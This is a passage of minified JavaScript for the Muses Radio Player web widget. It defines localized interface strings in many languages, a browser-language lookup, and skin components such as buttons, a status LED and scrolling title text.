        this.restoreTitle();
      },
      showContextMenu: function (a) {
        l.display(
          window.pageXOffset + a.clientX,
          window.pageYOffset + a.clientY,
          this.title,
          this.language
        );
        a.preventDefault();
        z.track("ui", "showContextMenu", this.muses);
      },
      __class__: B,
    };
    d = function () {
      this.byText = new v();
    };
    d.__name__ = ["muses", "internationalization", "AbstractLanguage"];
    d.prototype = {
      getText: function (a) {
        var b = this.byText;
        return null != t[a] ? b.getReserved(a) : b.h[a];
      },
      setText: function (a, b) {
        var c = this.byText;
        null != t[a] ? c.setReserved(a, b) : (c.h[a] = b);
      },
      getTextAlign: function () {
        return "left";
      },
      __class__: d,
    };
    var da = function () {
      this.byText = new v();
      this.setText(
        "play",
        "\u0546\u057e\u0561\u0563\u0561\u0580\u056f\u0565\u056c"
      );
      this.setText(
        "stop",
        "\u053f\u0561\u0576\u0563\u0576\u0565\u0581\u0576\u0565\u056c"
      );
      this.setText(
        "intro",
        "\u0546\u0565\u0580\u0561\u056e\u0578\u0582\u0569\u0575\u0578\u0582\u0576"
      );
      this.setText(
        "ioError",
        "\u0551\u0561\u0576\u0581\u0561\u0575\u056b\u0576 \u057d\u056d\u0561\u056c"
      );
      this.setText(
        "loadComplete",
        "\u054d\u056d\u0561\u056c. \u0562\u0565\u057c\u0576\u0578\u0582\u0574\u0576 \u0561\u057e\u0561\u0580\u057f\u057e\u0561\u056e \u0567"
      );
      this.setText(
        "soundComplete",
        "\u054d\u056d\u0561\u056c. \u0576\u057e\u0561\u0563\u0561\u0580\u056f\u0578\u0582\u0574\u0576 \u0561\u057e\u0561\u0580\u057f\u057e\u0561\u056e \u0567"
      );
      this.setText(
        "volume",
        "\u0541\u0561\u0575\u0576\u056b \u0562\u0561\u0580\u0571\u0580\u0578\u0582\u0569\u0575\u0578\u0582\u0576"
      );
      this.setText(
        "securityError",
        "\u0531\u0576\u057e\u057f\u0561\u0576\u0563\u0578\u0582\u0569\u0575\u0561\u0576 \u057d\u056d\u0561\u056c"
      );
      this.setText(
        "about",
        "\u00abMuses\u00bb \u057c\u0561\u0564\u056b\u0578 \u0576\u057e\u0561\u0563\u0561\u0580\u056f\u0579\u056b \u0574\u0561\u057d\u056b\u0576"
      );
      this.setText(
        "version",
        "\u054f\u0561\u0580\u0562\u0565\u0580\u0561\u056f"
      );
    };
    da.__name__ = ["muses", "internationalization", "Armenian"];
    da.__super__ = d;
    da.prototype = k(d.prototype, { __class__: da });
    var ea = function () {
      this.byText = new v();
      this.setText("play", "\u0412\u043a\u043b\u044e\u0447\u0438");
      this.setText("stop", "\u0418\u0437\u043a\u043b\u044e\u0447\u0438");
      this.setText(
        "ioError",
        "\u0413\u0440\u0435\u0448\u043a\u0430 \u0432 \u0441\u0432\u044a\u0440\u0437\u0432\u0430\u043d\u0435\u0442\u043e"
      );
      this.setText(
        "loadComplete",
        "\u0413\u0440\u0435\u0448\u043a\u0430: \u0417\u0430\u0432\u044a\u0440\u0448\u0435\u043d\u043e \u0437\u0430\u0440\u0435\u0436\u0434\u0430\u043d\u0435"
      );
      this.setText(
        "soundComplete",
        "\u0413\u0440\u0435\u0448\u043a\u0430: \u0417\u0430\u0432\u044a\u0440\u0448\u0435\u043d\u043e \u0437\u0430\u0440\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u0437\u0432\u0443\u043a"
      );
      this.setText(
        "volume",
        "\u0421\u0438\u043b\u0430 \u043d\u0430 \u0437\u0432\u0443\u043a\u0430"
      );
      this.setText(
        "securityError",
        "\u0413\u0440\u0435\u0448\u043a\u0430 \u0432 \u0441\u0438\u0433\u0443\u0440\u043d\u043e\u0441\u0442\u0442\u0430"
      );
      this.setText("about", "\u0417\u0430 Muses Radio Player...");
      this.setText("version", "\u0412\u0435\u0440\u0441\u0438\u044f ....");
      this.setText("intro", "\u0418\u043d\u0442\u0440\u043e");
    };
    ea.__name__ = ["muses", "internationalization", "Bulgarian"];
    ea.__super__ = d;
    ea.prototype = k(d.prototype, { __class__: ea });
    var fa = function () {
      this.byText = new v();
      this.setText("play", "Reprodueix");
      this.setText("stop", "Atura");
      this.setText("ioError", "Error de xarxa");
      this.setText("loadComplete", "Error: s'ha completat la c\u00e0rrega");
      this.setText("soundComplete", "Error: s'ha completat el so");
      this.setText("volume", "Volum");
      this.setText("securityError", "Error de seguretat");
      this.setText("about", "Quant a Muses Radio Player...");
      this.setText("version", "Versi\u00f3");
      this.setText("intro", "Introducci\u00f3");
    };
    fa.__name__ = ["muses", "internationalization", "Catalan"];
    fa.__super__ = d;
    fa.prototype = k(d.prototype, { __class__: fa });
    var ha = function () {
      this.byText = new v();
      this.setText("play", "\u64ad\u653e");
      this.setText("stop", "\u505c\u6b62");
      this.setText("intro", "\u7b80\u4ecb");
      this.setText("ioError", "\u7f51\u7edc\u51fa\u9519");
      this.setText("loadComplete", "\u9519\u8bef: \u4e0b\u8f7d\u7ed3\u675f");
      this.setText("soundComplete", "\u9519\u8bef: \u58f0\u97f3\u7ed3\u675f");
      this.setText("volume", "\u97f3\u91cf");
      this.setText("securityError", "\u5b89\u5168\u6027\u9519\u8bef");
      this.setText("about", "\u5173\u4e8eMuses Radio Player");
      this.setText("version", "\u7248\u672c");
    };
    ha.__name__ = ["muses", "internationalization", "Chinese"];
    ha.__super__ = d;
    ha.prototype = k(d.prototype, { __class__: ha });
    var ia = function () {
      this.byText = new v();
      this.setText("play", "Pokreni");
      this.setText("stop", "Zaustavi");
      this.setText("ioError", "Gre\u0161ka u mre\u017ei");
      this.setText(
        "loadComplete",
        "Gre\u0161ka: U\u010ditavanje zavr\u0161eno"
      );
      this.setText("soundComplete", "Gre\u0161ka: Zvuk zavr\u0161en");
      this.setText("volume", "Glasno\u0107a");
      this.setText("securityError", "Sigurnosna gre\u0161ka");
      this.setText("about", "O Muses Radio Player...");
      this.setText("version", "Verzija");
    };
    ia.__name__ = ["muses", "internationalization", "Croatian"];
    ia.__super__ = d;
    ia.prototype = k(d.prototype, { __class__: ia });
    var ja = function () {
      this.byText = new v();
      this.setText("play", "P\u0159ehr\u00e1t");
      this.setText("stop", "Zastavit");
      this.setText("intro", "\u00davod");
      this.setText("ioError", "Chyba s\u00edt\u011b");
      this.setText("loadComplete", "Chyba: na\u010dteno");
      this.setText("soundComplete", "Chyba: zvuk kompletn\u00ed");
      this.setText("volume", "Hlasitost");
      this.setText("securityError", "Chyba zabezpe\u010den\u00ed");
      this.setText("about", "O Muses Radio p\u0159ehr\u00e1va\u010di...");
      this.setText("version", "Verze");
    };
    ja.__name__ = ["muses", "internationalization", "Czech"];
    ja.__super__ = d;
    ja.prototype = k(d.prototype, { __class__: ja });
    var ka = function () {
      this.byText = new v();
      this.setText("play", "Afspelen");
      this.setText("stop", "Stoppen");
      this.setText("ioError", "Netwerkfout");
      this.setText("loadComplete", "Fout: Laden afgelopen");
      this.setText("soundComplete", "Fout: Geluid afgelopen");
      this.setText("volume", "Volume");
      this.setText("securityError", "Beveiligingsfout");
      this.setText("about", "Over Muses Radio Player...");
      this.setText("version", "Versie");
      this.setText("intro", "Intro");
    };
    ka.__name__ = ["muses", "internationalization", "Dutch"];
    ka.__super__ = d;
    ka.prototype = k(d.prototype, { __class__: ka });
    var la = function () {
      this.byText = new v();
      this.setText("play", "Play");
      this.setText("stop", "Stop");
      this.setText("ioError", "Network Error");
      this.setText("loadComplete", "Error: Load Complete");
      this.setText("soundComplete", "Error: Sound Complete");
      this.setText("volume", "Volume");
      this.setText("securityError", "Security Error");
      this.setText("about", "About Muses Radio Player...");
      this.setText("version", "Version");
      this.setText("intro", "Intro");
    };
    la.__name__ = ["muses", "internationalization", "English"];
    la.__super__ = d;
    la.prototype = k(d.prototype, { __class__: la });
    var ma = function () {
      this.byText = new v();
      this.setText("play", "Toista");
      this.setText("stop", "Pys\u00e4yt\u00e4");
      this.setText("ioError", "Verkkoyhteysvirhe");
      this.setText("loadComplete", "Lataaminen p\u00e4\u00e4ttyi");
      this.setText("soundComplete", "\u00c4\u00e4nentoisto p\u00e4\u00e4ttyi");
      this.setText("volume", "\u00c4\u00e4nenvoimakkuus");
      this.setText("securityError", "Tietoturvavirhe");
      this.setText("about", "Tietoja Muses Radio Player:sta...");
      this.setText("version", "Versio");
    };
    ma.__name__ = ["muses", "internationalization", "Finnish"];
    ma.__super__ = d;
    ma.prototype = k(d.prototype, { __class__: ma });
    var na = function () {
      this.byText = new v();
      this.setText("play", "Jouer");
      this.setText("stop", "Arr\u00eater");
      this.setText("ioError", "Erreur r\u00e9seau");
      this.setText("loadComplete", "Erreur: Chargement complet");
      this.setText("soundComplete", "Erreur: Son complet");
      this.setText("volume", "Volume");
      this.setText("securityError", "Erreur de s\u00e9curit\u00e9");
      this.setText("about", "A propos de Muses Radio Player...");
      this.setText("version", "Version");
    };
    na.__name__ = ["muses", "internationalization", "French"];
    na.__super__ = d;
    na.prototype = k(d.prototype, { __class__: na });
    var W = function () {
      this.byText = new v();
      this.setText("play", "Abspielen");
      this.setText("stop", "Stop");
      this.setText("ioError", "Netzwerk-Fehler");
      this.setText("loadComplete", "Fehler: Full Load");
      this.setText("soundComplete", "Fehler: Full Audio");
      this.setText("volume", "Lautst\u00e4rke");
      this.setText("securityError", "Sicherheit Fehler");
      this.setText("about", "\u00dcber Muses Radio Player...");
      this.setText("version", "Version");
    };
    W.__name__ = ["muses", "internationalization", "German"];
    W.__super__ = d;
    W.prototype = k(d.prototype, { __class__: W });
    var oa = function () {
      this.byText = new v();
      this.setText(
        "play",
        "\u0391\u03bd\u03b1\u03c0\u03b1\u03c1\u03b1\u03b3\u03c9\u03b3\u03ae"
      );
      this.setText("stop", "\u0394\u03b9\u03b1\u03ba\u03bf\u03c0\u03ae");
      this.setText(
        "ioError",
        "\u03a3\u03c6\u03ac\u03bb\u03bc\u03b1 \u03b4\u03b9\u03ba\u03c4\u03cd\u03bf\u03c5"
      );
      this.setText(
        "loadComplete",
        "\u03a3\u03c6\u03ac\u03bb\u03bc\u03b1: \u03b7 \u03bc\u03b5\u03c4\u03b1\u03c6\u03cc\u03c1\u03c4\u03c9\u03c3\u03b7 \u03bf\u03bb\u03bf\u03ba\u03bb\u03b7\u03c1\u03ce\u03b8\u03b7\u03ba\u03b5"
      );
      this.setText(
        "soundComplete",
        "\u03a3\u03c6\u03ac\u03bb\u03bc\u03b1: \u03bf \u03ae\u03c7\u03bf\u03c2 \u03bf\u03bb\u03bf\u03ba\u03bb\u03b7\u03c1\u03ce\u03b8\u03b7\u03ba\u03b5"
      );
      this.setText("volume", "\u0388\u03bd\u03c4\u03b1\u03c3\u03b7");
      this.setText(
        "securityError",
        "\u03a3\u03c6\u03ac\u03bb\u03bc\u03b1 \u03b1\u03c3\u03c6\u03b1\u03bb\u03b5\u03af\u03b1\u03c2"
      );
      this.setText(
        "about",
        "\u03a0\u03b5\u03c1\u03af \u03c4\u03bf\u03c5 Muses Radio Player..."
      );
      this.setText("version", "\u0388\u03ba\u03b4\u03bf\u03c3\u03b7");
      this.setText("intro", "\u0395\u03b9\u03c3\u03b1\u03b3\u03c9\u03b3\u03ae");
    };
    oa.__name__ = ["muses", "internationalization", "Greek"];
    oa.__super__ = d;
    oa.prototype = k(d.prototype, { __class__: oa });
    var X = function () {
      this.byText = new v();
      this.setText("play", "\u05de\u05ea\u05e0\u05d2\u05df");
      this.setText("stop", "\u05de\u05d5\u05e4\u05e1\u05e7");
      this.setText(
        "ioError",
        "\u05e9\u05d2\u05d9\u05d0\u05ea \u05d7\u05d9\u05d1\u05d5\u05e8"
      );
      this.setText(
        "loadComplete",
        "\u05e9\u05d2\u05d9\u05d0\u05d4: \u05d4\u05d8\u05e2\u05d9\u05e0\u05d4 \u05d4\u05e1\u05ea\u05d9\u05d9\u05de\u05d4"
      );
      this.setText(
        "soundComplete",
        "\u05e9\u05d2\u05d9\u05d0\u05d4: \u05d4\u05e9\u05de\u05e2 \u05d4\u05e1\u05ea\u05d9\u05d9\u05dd"
      );
      this.setText("volume", "\u05e2\u05d5\u05e6\u05de\u05d4");
      this.setText(
        "securityError",
        "\u05e9\u05d2\u05d9\u05d0\u05ea \u05d0\u05d1\u05d8\u05d7\u05d4"
      );
      this.setText(
        "about",
        "\u05d0\u05d5\u05d3\u05d5\u05ea Muses Radio Player..."
      );
      this.setText("version", "\u05d2\u05d9\u05e8\u05e1\u05d4");
      this.setText("intro", "\u05e4\u05ea\u05d9\u05d7");
    };
    X.__name__ = ["muses", "internationalization", "Hebrew"];
    X.__super__ = d;
    X.prototype = k(d.prototype, {
      getTextAlign: function () {
        return "right";
      },
      __class__: X,
    });
    var pa = function () {
      this.byText = new v();
      this.setText("play", "Lej\u00e1tsz\u00e1s");
      this.setText("stop", "Stop");
      this.setText("ioError", "Hl\u00f3zati hiba");
      this.setText(
        "loadComplete",
        "Hiba: a let\u00f6lt\u00e9s befejezod\u00f6tt"
      );
      this.setText("soundComplete", "Hiba: a hang megszakadt");
      this.setText("volume", "Hangero");
      this.setText("securityError", "Biztons\u00e1gi hiba");
      this.setText("about", "Bovebben az Muses Radio Player-r\u00f3l...");
      this.setText("version", "Verzi\u00f3");
    };
    pa.__name__ = ["muses", "internationalization", "Hungarian"];
    pa.__super__ = d;
    pa.prototype = k(d.prototype, { __class__: pa });
    var qa = function () {
      this.byText = new v();
      this.setText("play", "Seinn");
      this.setText("stop", "Stad");
      this.setText("intro", "Seoladh Isteach ");
      this.setText("ioError", "Earr\u00e1id ar an L\u00edonra");
      this.setText(
        "loadComplete",
        "Earr\u00e1id: L\u00f3d curtha i gcr\u00edch"
      );
      this.setText("soundComplete", "Earr\u00e1id: Fuaim curtha i gcr\u00edch");
      this.setText("volume", "Airde");
      this.setText("securityError", "Earr\u00e1id Sl\u00e1nd\u00e1la");
      this.setText("about", "Maidir le Seinnteoir Raidi\u00f3 Muses...");
      this.setText("version", "Leagan");
    };
    qa.__name__ = ["muses", "internationalization", "Irish"];
    qa.__super__ = d;
    qa.prototype = k(d.prototype, { __class__: qa });
    var ra = function () {
      this.byText = new v();
      this.setText("play", "Riprodurre");
      this.setText("stop", "Fermare");
      this.setText("ioError", "Errore di rete");
      this.setText("loadComplete", "Erreur: Completo carico");
      this.setText("soundComplete", "Errore: Audio completo");
      this.setText("volume", "Volume");
      this.setText("securityError", "Errore di Sicurezza");
      this.setText("about", "Circa Muses Radio Player ...");
      this.setText("version", "Versione");
    };
    ra.__name__ = ["muses", "internationalization", "Italian"];
    ra.__super__ = d;
    ra.prototype = k(d.prototype, { __class__: ra });
    var Ga = function () {};
    Ga.__name__ = ["muses", "internationalization", "LanguageFactory"];
    Ga.factory = function (a) {
      if (null == a || "auto" == a)
        (a = window.navigator.language), null != a && (a = a.split("-")[0]);
      switch (a) {
        case "bg":
          return new ea();
        case "ca":
          return new fa();
        case "cs":
          return new ja();
        case "de":
          return new W();
        case "el":
          return new oa();
        case "es":
          return new Y();
        case "fi":
          return new ma();
        case "fr":
          return new na();
        case "ga":
          return new qa();
        case "ger":
          return new W();
        case "he":
          return new X();
        case "hr":
          return new ia();
        case "hu":
          return new pa();
        case "hy":
          return new da();
        case "it":
          return new ra();
        case "iw":
          return new X();
        case "nb":
          return new R();
        case "nl":
          return new ka();
        case "nn":
          return new R();
        case "nw":
          return new R();
        case "pl":
          return new sa();
        case "pt":
          return new ta();
        case "ru":
          return new ua();
        case "sl":
          return new va();
        case "sp":
          return new Y();
        case "sv":
          return new wa();
        case "tr":
          return new xa();
        case "tt":
          return new ya();
        case "uk":
          return new za();
        case "zh":
          return new ha();
      }
      return new la();
    };
    var R = function () {
      this.byText = new v();
      this.setText("play", "Spill av");
      this.setText("stop", "Stopp");
      this.setText("ioError", "Nettverksfeil");
      this.setText("loadComplete", "Feil: Lasting fullf\u00f8rt");
      this.setText("soundComplete", "Feil: Lyd fullf\u00f8rt");
      this.setText("volume", "Volum");
      this.setText("securityError", "Sikkerhetsfeil");
      this.setText("about", "Om Muses Radio Player...");
      this.setText("version", "Versjon");
    };
    R.__name__ = ["muses", "internationalization", "Norwegian"];
    R.__super__ = d;
    R.prototype = k(d.prototype, { __class__: R });
    var sa = function () {
      this.byText = new v();
      this.setText("play", "Odtw\u00f3rz");
      this.setText("stop", "Stop");
      this.setText("ioError", "B\u0142\u0105d sieciowy");
      this.setText(
        "loadComplete",
        "B\u0142\u0105d: \u0141adowanie zako\u0144czone"
      );
      this.setText(
        "soundComplete",
        "B\u0142\u0105d: \u0141adowanie audio zako\u0144czone"
      );
      this.setText("volume", "G\u0142o\u015bno\u015b\u0107");
      this.setText("securityError", "B\u0142\u0105d zabezpiecze\u0144");
      this.setText("about", "O Muses Radio Player...");
      this.setText("version", "Wersja");
    };
    sa.__name__ = ["muses", "internationalization", "Polish"];
    sa.__super__ = d;
    sa.prototype = k(d.prototype, { __class__: sa });
    var ta = function () {
      this.byText = new v();
      this.setText("play", "Tocar");
      this.setText("stop", "Parar");
      this.setText("ioError", "Erro de Rede");
      this.setText("loadComplete", "Erro: terminou de carregar");
      this.setText("soundComplete", "Erro: fim do \u00e1udio");
      this.setText("volume", "Volume");
      this.setText("securityError", "Erro de Seguran\u00e7a");
      this.setText("about", "Sobre Muses Radio Player...");
      this.setText("version", "Vers\u00e3o");
    };
    ta.__name__ = ["muses", "internationalization", "Portuguese"];
    ta.__super__ = d;
    ta.prototype = k(d.prototype, { __class__: ta });
    var ua = function () {
      this.byText = new v();
      this.setText(
        "play",
        "\u0412\u043e\u0441\u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0441\u0442\u0438"
      );
      this.setText(
        "stop",
        "\u041e\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c"
      );
      this.setText(
        "ioError",
        "\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f"
      );
      this.setText(
        "loadComplete",
        "\u041e\u0448\u0438\u0431\u043a\u0430: \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430"
      );
      this.setText(
        "soundComplete",
        "\u041e\u0448\u0438\u0431\u043a\u0430: \u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u043e\u0441\u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u044f"
      );
      this.setText(
        "volume",
        "\u0423\u0440\u043e\u0432\u0435\u043d\u044c \u0437\u0432\u0443\u043a\u0430"
      );
      this.setText(
        "securityError",
        "\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u043e"
      );
      this.setText(
        "about",
        "\u041f\u043e\u0434\u0440\u043e\u0431\u043d\u0435\u0435 \u043e Muses Radio Player..."
      );
      this.setText("version", "\u0412\u0435\u0440\u0441\u0438\u044f");
    };
    ua.__name__ = ["muses", "internationalization", "Russian"];
    ua.__super__ = d;
    ua.prototype = k(d.prototype, { __class__: ua });
    var va = function () {
      this.byText = new v();
      this.setText("play", "Predvajaj");
      this.setText("stop", "Stop");
      this.setText("ioError", "Omre\u017ena napaka");
      this.setText("loadComplete", "Napaka: Nalaganje kon\u010dano");
      this.setText("soundComplete", "Napaka: Ni zvoka");
      this.setText("volume", "Glasnost");
      this.setText("securityError", "Varnostna napaka");
      this.setText("about", "O Muses Radio Player...");
      this.setText("version", "Verzija");
      this.setText("intro", "Uvod");
    };
    va.__name__ = ["muses", "internationalization", "Slovene"];
    va.__super__ = d;
    va.prototype = k(d.prototype, { __class__: va });
    var Y = function () {
      this.byText = new v();
      this.setText("play", "Reproducir");
      this.setText("stop", "Detener");
      this.setText("ioError", "Error de Red");
      this.setText("loadComplete", "Error: Carga completa");
      this.setText("soundComplete", "Error: Sonido completo");
      this.setText("volume", "Volumen");
      this.setText("securityError", "Error de Seguridad");
      this.setText("about", "Acerca de Muses Radio Player...");
      this.setText("version", "Versi\u00f3n");
      this.setText("intro", "Intro");
    };
    Y.__name__ = ["muses", "internationalization", "Spanish"];
    Y.__super__ = d;
    Y.prototype = k(d.prototype, { __class__: Y });
    var wa = function () {
      this.byText = new v();
      this.setText("play", "Spelar");
      this.setText("stop", "Stoppad");
      this.setText("ioError", "N\u00e4tverksfel");
      this.setText("loadComplete", "Fel: Laddning komplett");
      this.setText("soundComplete", "Fel: Ljud komplett");
      this.setText("volume", "Volym");
      this.setText("securityError", "S\u00e4kerhetsfel");
      this.setText("about", "Om Muses Radio Player...");
      this.setText("version", "Version");
      this.setText("intro", "Intro");
    };
    wa.__name__ = ["muses", "internationalization", "Swedish"];
    wa.__super__ = d;
    wa.prototype = k(d.prototype, { __class__: wa });
    var ya = function () {
      this.byText = new v();
      this.setText("play", "\u0423\u0439\u043d\u0430\u0442\u0443");
      this.setText("stop", "\u0422\u0443\u043a\u0442\u0430\u0442\u0443");
      this.setText("intro", "\u0418\u043d\u0442\u0440\u043e");
      this.setText(
        "ioError",
        "\u0427\u0435\u043b\u0442\u04d9\u0440 \u0425\u0430\u0442\u0430\u0441\u044b"
      );
      this.setText(
        "loadComplete",
        "\u0425\u0430\u0442\u0430: \u0419\u04e9\u043a\u043b\u04d9\u04af \u0442\u04d9\u043c\u0430\u043c"
      );
      this.setText(
        "soundComplete",
        "\u0425\u0430\u0442\u0430: \u0422\u0430\u0432\u044b\u0448 \u0442\u04d9\u043c\u0430\u043c"
      );
      this.setText("volume", "\u0422\u0430\u0432\u044b\u0448");
      this.setText(
        "securityError",
        "\u041a\u0443\u0440\u043a\u044b\u043d\u044b\u0447\u0441\u044b\u0437\u043b\u044b\u043a \u0445\u0430\u0442\u0430\u0441\u044b"
      );
      this.setText(
        "about",
        "Muses Radio Player \u0422\u0443\u0440\u044b\u043d\u0434\u0430..."
      );
      this.setText("version", "\u0412\u0435\u0440\u0441\u0438\u044f");
    };
    ya.__name__ = ["muses", "internationalization", "Tatar"];
    ya.__super__ = d;
    ya.prototype = k(d.prototype, { __class__: ya });
    var xa = function () {
      this.byText = new v();
      this.setText("play", "\u00c7al");
      this.setText("stop", "Durdur");
      this.setText("ioError", "A\u011f hatas\u0131");
      this.setText("loadComplete", "Hata: Y\u00fcklenme Tamamland\u0131");
      this.setText("soundComplete", "Hata: Yay\u0131n Tamamland\u0131");
      this.setText("volume", "Ses");
      this.setText("securityError", "G\u00fcvenlik Hatas\u0131");
      this.setText("about", "Muses Radio Player Hakk\u0131nda...");
      this.setText("version", "S\u00fcr\u00fcm");
    };
    xa.__name__ = ["muses", "internationalization", "Turkish"];
    xa.__super__ = d;
    xa.prototype = k(d.prototype, { __class__: xa });
    var za = function () {
      this.byText = new v();
      this.setText(
        "play",
        "\u0412\u0456\u0434\u0442\u0432\u043e\u0440\u0438\u0442\u0438"
      );
      this.setText("stop", "\u0417\u0443\u043f\u0438\u043d\u0438\u0442\u0438");
      this.setText(
        "ioError",
        "\u041f\u043e\u043c\u0438\u043b\u043a\u0430 \u043c\u0435\u0440\u0435\u0436\u0456"
      );
      this.setText(
        "loadComplete",
        "\u041f\u043e\u043c\u0438\u043b\u043a\u0430: \u0417\u0430\u0432\u0430\u043d\u0442\u0430\u0436\u0435\u043d\u043d\u044f \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u043e"
      );
      this.setText(
        "soundComplete",
        "\u041f\u043e\u043c\u0438\u043b\u043a\u0430: \u0417\u0432\u0443\u043a \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u043e"
      );
      this.setText(
        "volume",
        "\u0433\u0443\u0447\u043d\u0456\u0441\u0442\u044c"
      );
      this.setText(
        "securityError",
        "\u041f\u043e\u043c\u0438\u043b\u043a\u0430 \u0434\u043e\u0441\u0442\u0443\u043f\u0443"
      );
      this.setText("about", "\u041f\u0440\u043e Muses Radio Player...");
      this.setText("version", "\u0412\u0435\u0440\u0441\u0456\u044f");
      this.setText(
        "intro",
        "\u0412\u0441\u0442\u0443\u043f\u043d\u0435 \u0432\u0456\u0442\u0430\u043d\u043d\u044f"
      );
    };
    za.__name__ = ["muses", "internationalization", "Ukrainian"];
    za.__super__ = d;
    za.prototype = k(d.prototype, { __class__: za });
    var C = function (a) {
      this.styleWidth = this.styleHeight = 0;
      this.ui = a;
      this.configured = !1;
      this.container = window.document.createElement("div");
      this.container.style.position = "absolute";
    };
    C.__name__ = ["muses", "skin", "UIComponent"];
    C.prototype = {
      setVisible: function (a) {
        this.container.style.display = a ? "block" : "none";
      },
      configure: function (a) {
        this.configured = !0;
        var b = B.parseInt(a.get("x"), 0);
        this.container.style.left = b + "px";
        b = B.parseInt(a.get("y"), 0);
        this.container.style.top = b + "px";
        this.styleWidth = B.parseInt(a.get("width"), 0);
        this.styleHeight = B.parseInt(a.get("height"), 0);
        null != a.get("width") &&
          (this.container.style.width = this.styleWidth + "px");
        null != a.get("height") &&
          (this.container.style.height = this.styleHeight + "px");
      },
      appendChild: function (a, b) {
        null == b && (b = !0);
        a.style.position = "absolute";
        a.style.left = a.style.top = "0px";
        a.style.display = b ? "block" : "none";
        this.container.appendChild(a);
      },
      __class__: C,
    };
    var V = function (a, b) {
      var c = this;
      C.call(this, a);
      this.mouseOverState = new Image();
      this.mouseDownState = new Image();
      this.noMouseState = new Image();
      this.container.title = b;
      this.mouseDownState.style.opacity = "0";
      this.mouseOverState.style.opacity = "0";
      this.container.onmouseup = function (a) {
        c.mouseDownState.style.opacity = "0";
        c.mouseOverState.style.opacity = "1";
      };
      this.container.onmousedown = function (a) {
        c.mouseDownState.style.opacity = "1";
        c.mouseOverState.style.opacity = "0";
      };
      this.container.onmouseover = function (a) {
        c.mouseOverState.style.opacity = "1";
      };
      this.container.onmouseout = function (a) {
        c.mouseDownState.style.opacity = "0";
        c.mouseOverState.style.opacity = "0";
      };
    };
    V.__name__ = ["muses", "skin", "Button"];
    V.__super__ = C;
    V.prototype = k(C.prototype, {
      configure: function (a) {
        C.prototype.configure.call(this, a);
        null != a.get("bgimage") &&
          (this.ui.loadImage(this.noMouseState, a.get("bgimage")),
          (this.noMouseState.style.cursor = "pointer"),
          this.appendChild(this.noMouseState));
        null != a.get("clickimage") &&
          (this.ui.loadImage(this.mouseDownState, a.get("clickimage")),
          (this.mouseDownState.style.cursor = "pointer"),
          this.appendChild(this.mouseDownState));
        this.ui.loadImage(this.mouseOverState, a.get("image"));
        this.appendChild(this.mouseOverState);
        this.mouseOverState.style.cursor = "pointer";
      },
      __class__: V,
    });
    var ba = function (a) {
      C.call(this, a);
      this.playMC = new Image();
      this.stopMC = new Image();
    };
    ba.__name__ = ["muses", "skin", "StatusLed"];
    ba.__super__ = C;
    ba.prototype = k(C.prototype, {
      configure: function (a) {
        C.prototype.configure.call(this, a);
        null != a.get("imageplay") &&
          -1 == a.get("imageplay").indexOf(".swf") &&
          (this.ui.loadImage(this.playMC, a.get("imageplay")),
          this.appendChild(this.playMC, !1));
        null != a.get("imagestop") &&
          -1 == a.get("imagestop").indexOf(".swf") &&
          (this.ui.loadImage(this.stopMC, a.get("imagestop")),
          this.appendChild(this.stopMC, !0));
      },
      on: function () {
        this.playMC.style.display = "block";
        this.stopMC.style.display = "none";
      },
      off: function () {
        this.playMC.style.display = "none";
        this.stopMC.style.display = "block";
      },
      __class__: ba,
    });
    var Q = function (a) {
      this.innerDIV = null;
      this.scrollDiff = 0;
      C.call(this, a);
      this.container.style.fontFamily = "Silkscreen";
      this.container.style.fontSize = "12px";
      this.innerDIV = window.document.createElement("div");
    };
    Q.__name__ = ["muses", "skin", "TitleText"];
    Q.__super__ = C;
    Q.prototype = k(C.prototype, {
      configureText: function (a, b) {
        this.configure(a);
        this.innerDIV.style.fontFamily = a.get("font");
        var c = B.parseInt(a.get("size"), 12);
        this.innerDIV.style.fontSize = c + "px";
        this.innerDIV.style.color = a.get("color");
        this.innerDIV.style.whiteSpace = "nowrap";
        this.innerDIV.style.padding = "2px";
        this.innerDIV.addEventListener("transitionend", u(this, this.scroll));
        switch (a.get("align")) {
          case "center":
            a = "center";
            break;
          case "right":
            a = "right";
            break;
          default:
            a = b;
        }
        this.innerDIV.style.textAlign = a;
        this.container.style.overflow = "hidden";
        this.container.style.transition = "opacity 300ms";
        this.container.style.opacity = "0";
        this.container.appendChild(this.innerDIV);
      },
      setText: function (a) {
        if ("" == a) this.container.style.opacity = "0";
        else {
          this.container.style.opacity = "1";
          var b =
            a + " &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;" + a;
          this.innerDIV.innerHTML != a &&
            this.innerDIV.innerHTML != b &&
            ((this.innerDIV.innerHTML = a),
            this.disableScrolling(),
            this.container.scrollWidth - 6 > this.styleWidth &&
              ((this.scrollDiff = this.container.scrollWidth),
              (this.innerDIV.innerHTML = b),
              (this.scrollDiff -= this.container.scrollWidth),
              this.scroll()));
        }
      },
      scroll: function () {
        var a = this;
        this.innerDIV.style.transition = "";
        this.innerDIV.style.transitionDelay = "";
        this.innerDIV.style.transform = "translate(0px , 0px)";
        G.delay(function () {
          0 != a.scrollDiff &&
            ((a.innerDIV.style.transition = "transform 10000ms"),
            (a.innerDIV.style.transitionDelay = "5s"),
            (a.innerDIV.style.transform =
              "translate(" + a.scrollDiff + "px, 0px)"));
        }, 1);
      },
      disableScrolling: function () {
        this.scrollDiff = 0;
        this.innerDIV.style.transition = "";
        this.innerDIV.style.transitionDelay = "";
        this.innerDIV.style.transform = "translate(0px , 0px)";
      },
      __class__: Q,
    });
    var ca = function (a, b) {
      C.call(this, a);
      this.muses = b;
      this.firstDraw = !0;
      this.bars = null;
      this.mousePressed = !1;
      this.volume = 1;
      this.setMode("bars");
      this.draw(this.container);
      this.vertMargin = this.horizMargin = this.height = this.width = 0;
